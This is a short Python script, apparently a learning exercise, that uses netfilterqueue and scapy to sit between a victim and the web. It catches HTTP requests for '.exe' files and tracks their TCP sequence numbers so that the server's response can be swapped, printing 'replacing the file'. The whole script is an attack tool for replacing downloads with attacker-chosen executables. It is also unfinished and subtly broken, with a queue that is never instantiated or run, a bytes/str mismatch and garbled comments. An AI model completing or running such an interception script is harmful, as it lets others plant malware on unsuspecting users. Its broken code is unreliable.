#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())## scapu.IP  this is converting ip packets.
    if scapy_packet.haslayer(scapy.Raw): ## this is a print the raw data.
        
      if scapy_packet[scapy.TCP].dport == 80: ## this is aaccess tcp destination port.
        
        if ".exe" in scapy_packet[scapy.Raw].load: ## this is a capture the .executed extension.
          print("[+] exe request")
          ack_list.append(scapy_packet[scapy.TCP].ack) ## this is append the list 
          print(scapy_packet.show())
          
        
      elif scapy_packet[scapy.TCP].sport == 80: ## this is a source port.
         
        if scapy_packet[scapy.TCP].seq in ack_list:
          ack_list.remove(scapy_packet[scapy.TCP].seq)  ## this is a remove the sequence.
        
          print("[+] replacing the file ")
          print(scapy_packet.show())
        
      
      
    packet.accept()
queue = netfilterqueue.NetfilterQueue 
queue.bind(0,process_packet) 
## copy and paste request response in text editor. 